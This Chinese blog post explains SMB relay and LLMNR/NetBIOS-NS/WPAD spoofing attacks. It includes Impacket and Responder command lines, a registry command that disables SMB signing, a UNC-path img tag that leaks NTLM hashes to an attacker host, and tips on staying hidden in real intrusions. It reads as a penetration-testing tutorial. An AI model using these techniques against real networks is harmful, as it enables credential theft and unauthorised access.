---
title: "SMB 重放攻击"
date: 2019-07-17T00:00:00+08:00
draft: false
tags: ['smb']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

SMB 重放攻击原理以及利用方式

<!--more-->

## 原理

![smb relay attack](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/smb_relay_attack.jpg)

可以看出, SMB 重放攻击的实质是 Client 本应该向 Attacker 请求的数据包被 Attacker 拿来以请求 Target.

##  重放

在早期的 SMB 重放攻击中, 允许将 Client 请求的数据包重放至 Client 本身, 这就造成了 `MS08-068` 漏洞, 但漏洞在 2008 R2 中已经被修复.

微软在 Server 系列的系统中默认开启 SMB 签名以防止重放攻击, 而个人系统诸如 Windows 7, Windows 10 则默认关闭签名.

同时, Windows 在发送 SMB 请求时, 如未手动指定凭据, 将会以当前用户的身份发送 SMB 认证请求.

### Impacket

利用 Impacket 包中的 `smbrelayx.py` 和 `ntlmrelayx.py` 可实现 SMB 重放攻击.

注意后者与前者在 SMB 重放中并无本质区别, 后者支持 SMB v2 协议, 不过在实际测试中两者均可在 2008 R2 系统上利用成功, 这里以 `smbrelayx.py` 为例.

`-h` 参数指定重放主机的 IP 地址, 留空则为重放至 Client 本身.

`-e` 参数指定重放成功后要执行的程序, `-c` 参数指定重放成功后要执行的命令, 留空则默认为导出 Hash.

对 2003 的利用方式, 即 `MS08-068`

```
./smbrelayx.py
```

该命令将在 Attacker 上启动 HTTP (用于 WPAD) 和 SMB 服务, 开放 80, 445 端口, 并将 SMB 数据包重放至来源主机.

此时在 2003 中向 Attacker 发送 SMB 请求, 如 `dir \\ATTACKER\c$`, 将会自动导出 NTLM Hash (非 Net-NTLM Hash).

如果要重放至 2008 R2 主机上, 则需要指定 `-h` 参数为其 IP 地址并禁用 SMB 签名.

```
reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f
```

```
./smbrelayx.py -h 192.168.1.100
```

此时在任意系统上对 Attacker 发送 SMB 请求, 如果凭据正确, 将会自动导出 2008 R2 的 NTLM Hash.

## 欺骗

那么就有一个问题, 如何让 Client 的流量经过 Attacker 呢?

1. 可以通过在 Client 经常访问的 Web 网站上插入 UNC 路径, 例如 `<img src="\\192.168.1.2\logo.jpg" />` 以进行 SMB 请求 (当前用户凭据).

2. 进行 NetBIOS-NS/LLMNR/WPAD 欺骗.

其中 NetBIOS-NS 和 LLMNR 对局域网内的主机名所对应的 IP 地址进行广播查询.

WPAD 则让浏览器能够自动发现代理服务器 (在 Internet 选项中勾选 "自动检测设置") 并下载配置文件 (PAC).

局域网内对主机名所对应的 IP 地址进行查询时, 会依照 `Hosts - DNS/Cache - LLMNR/NetBIOS-NS` 的顺序依次查询.

例如查询主机名 TEST 时, 主机首先会从 Hosts 文件里查找有没有其对应的 IP 地址, 然后从本地 DNS  缓存和 DNS 服务器上进行请求, 如仍未查询到, 则在局域网内发起 LLMNR/NetBIOS-NS 广播请求, 这时候如果存在 TEST 主机, 它就会回应该请求并给出 IP 地址.

而如果 TEST 主机不存在, 将会在一段时间内持续发送广播, 如果 Attacker 回应广播请求, 那么查询主机就会认为 Attacker 就是 TEST, 并连接至 Attacker 的 IP 地址.

注意如果 Attacker 赶在 TEST 主机的前面回应请求的话, 查询主机也会认为 Attacker 就是 TEST, 但自己在实际测试中, 效果并不理想.

默认 WPAD 服务器的主机名为 WPAD, 也能通过以上协议进行主机名欺骗.

### Responder

利用 Responder 来进行 LLMNR/NetBIOS-NS 以及 WPAD 欺骗.

```
responder -I eth0 -rwdv
```

`-r` `-d` 参数将会使 Attacker 回应更多的 NetBIOS-NS 请求包, 但可能会影响正常访问.

`-w` 参数使 Responder 开启 WPAD 代理服务器, 在不影响 HTTP 正常访问的情况下监听用户所浏览的 URL 及 Cookies 等信息, 也能获取到 Net-NTLM Hash.

另外还有 `-A` 参数指定 Responder 仅仅监听请求, 而不进行欺骗, 这对于管理员使用习惯的分析是一个很不错的方式.

至此在 Client 中对不存在的主机名发送请求, Responder 将会回应请求并获取到 Client 发送的 Net-NTLM Hash. 同时也会使 Client 启用 Responder 的 WPAD 代理服务器并对浏览内容进行持续监听.

注意在上文中也说过, 对局域网中已存在的主机名进行欺骗也能进行, 不过效果并不理想, 实际测试中仅在 Windows Server 2003 上测试成功 (欺骗 2003 机器的主机名).

### Responder + Impacket

Impacket 中的 `smbrelayx.py` 和 `ntlmrelayx.py` 不带有欺骗功能, 故需要与 Responder 配合使用以达到让流量经过 Attacker 的目的.

在 `Responder.conf` 中关闭 SMB 和 HTTP HTTPS 以及其它不需要的服务. 之后启动 Responder.

```
responder -I eth0 -rdv
```

启动 `smbrelayx.py`

```
./smbrelayx.py -h 192.168.1.100
```

这时在 Client 中对不存在的主机名发送 SMB 请求, Responder 会回应请求并指定 Attacker 的 IP 地址, 之后 Client 发送的 SMB 数据包会通过 `smbrelayx.py` 重放到指定的 IP 地址, 认证成功后导出 Target 的 Hash.

如果指定 `-w` 参数, Responder 将对 WPAD 进行主机名欺骗, 并让 Client 浏览器的代理配置地址设置为 Attacker 主机的 80 端口. 当 Client 首次浏览网页时, 会弹出基于 NTLM 协议的登录窗口, 用户输入账户凭据后便可继续浏览网页. 同时 `smbrelayx.py` 将接受账户凭据并重放 SMB 数据包至 Target, 认证成功后导出 Target 的 NTLM Hash.

## 总结

几种利用方式.

```
Client <---> Attacker (MS08-068) Impacket
Client ---> Attacker <---> Target (SMB Relay Attack) Impacket
Client <---> Attacker (LLMNR/NetBIOS-NS/WPAD Attack) Responder
Client ---> Attacker  <---> Target (LLMNR/NetBIOS-NS/WPAD) Responder + Impacket
```

一句话概括, 想要 SMB 重放, 就必须得用 Impacket, 想要流量经过自己, 就必须得用 Responder (或是 Web 服务器 + UNC 路径). 如果你是第一次在实战中利用这个漏洞, 建议先单独开 Responder 收集 Net-NTLM Hash 和浏览信息, 或者仅仅使用 `-A` 参数, 先摸清管理员的日常使用习惯, 再根据实际情况决定是否使用 Impacket.

`smbrelayx.py` 在 2008 R2 系统中的利用, 除非指定登录凭据, 否则就会拿当前用户的凭据进行登录, 这就需要 Client 和 Target 的用户凭据完全相同, 工作组中可能很少遇到, 但在域内环境中这和域控和域内计算机的关系非常类似, 域管理员在一般情况下可以直接登录域内的计算机. 利用这一点加上 UNC 路径可以更好的隐蔽, 同时又达到了欺骗的效果.

Responder 对已有主机名的欺骗效果不太理想, 事实上 Metasploit 中 Spoof 的一系列模块也是这样, 不过仔细想想, 这样也可以使得内网中的资源可以被正常访问, 也就提高了隐蔽性. 这里有一个利用场景: 内网中架设了防火墙, 如果计算机试图访问被防火墙拦截了的网址呢?

另外 Responder 中提供了自定义 PAC 的选项, 可以通过在某些网页弹出登录框的方式达到欺骗的效果 (例如管理员网站后台).

文章虽然有点长, 但大部分篇幅都在讲述如何进行 "欺骗" 而不是 "重放", 如果单纯去理解 SMB 重放攻击的话, 那就是一句话: 将别人的 SMB 数据包请求拿过来给自己用. 重放攻击和 SMB 签名息息相关, 理解了签名就会对重放攻击有一个比较清晰的认识了.